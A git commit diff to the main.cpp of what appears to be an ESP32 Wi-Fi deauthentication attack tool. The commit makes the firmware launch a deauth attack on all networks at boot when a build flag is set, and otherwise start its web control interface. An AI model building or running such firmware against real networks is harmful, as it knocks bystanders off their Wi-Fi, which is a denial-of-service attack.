19d4238e0022fd140bf54032c5e3597c9b31ad1e
marcbrunet92 <marcbrunet92@gmail.com>
2025-03-29 16:16:45 +0100

    Refactor setup function to conditionally start web interface or deauth attack based on DEAUTH_TYPE_ALL_BOOT

--- src/main.cpp
+++ src/main.cpp
@@ -8,24 +8,26 @@
 int curr_channel = 1;
 
 void setup() {
-#ifdef SERIAL_DEBUG
-  Serial.begin(115200);
-#endif
-#ifdef LED
-  pinMode(LED, OUTPUT);
-#endif
-
-  WiFi.mode(WIFI_MODE_AP);
-  WiFi.softAP(AP_SSID, AP_PASS);
-
-  start_web_interface();
-
-#if DEAUTH_TYPE_ALL_BOOT
-Serial.println("DEAUTH_TYPE_ALL_BOOT is enabled. Starting deauth attack...");
-uint16_t reason = 1; // Raison arbitraire (par exemple, 1)
-start_deauth(0, DEAUTH_TYPE_ALL, reason);
-#endif
-}
+  #ifdef SERIAL_DEBUG
+    Serial.begin(115200);
+  #endif
+  #ifdef LED
+    pinMode(LED, OUTPUT);
+  #endif
+  
+    WiFi.mode(WIFI_MODE_AP);
+  
+  #if DEAUTH_TYPE_ALL_BOOT
+    // Si DEAUTH_TYPE_ALL_BOOT est activé, démarrer l'attaque et désactiver l'interface web
+    Serial.println("DEAUTH_TYPE_ALL_BOOT is enabled. Starting deauth attack...");
+    uint16_t reason = 1; // Raison arbitraire
+    start_deauth(0, DEAUTH_TYPE_ALL, reason);
+  #else
+    // Sinon, démarrer l'interface web
+    WiFi.softAP(AP_SSID, AP_PASS);
+    start_web_interface();
+  #endif
+  }
 
 void loop() {
   if (deauth_type == DEAUTH_TYPE_ALL) {
